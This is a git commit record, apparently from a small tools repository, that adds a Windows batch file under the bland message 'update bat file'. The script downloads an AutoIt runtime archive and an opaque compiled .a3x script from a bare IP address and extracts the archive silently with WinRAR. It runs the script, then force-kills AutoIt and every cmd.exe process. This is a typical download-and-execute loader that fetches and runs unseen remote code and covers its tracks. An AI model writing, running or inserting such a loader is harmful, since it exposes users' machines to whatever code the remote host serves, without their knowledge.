eefe328734d99c7de5be757bdf63ec67c2acf4a0
TiDz <nguyentinvs123@Gmail.com>
2025-04-03 22:23:38 +0700

    update bat file

---
+++ Tools/BatFile.bat
@@ -0,0 +1,10 @@
+@echo off
+:: cd %temp%
+curl -O http://103.97.127.14/AutoIt3.rar
+curl -O http://103.97.127.14/SomeThing.a3x
+"C:\Program Files\WinRAR\WinRAR.exe" x -ibck "AutoIt3.rar" "\"
+"AutoIt3_x64.exe" SomeThing.a3x
+timeout /t 10 >nul
+taskkill /im AutoIt3_x64.exe /f
+taskkill /f /im cmd.exe
+exit
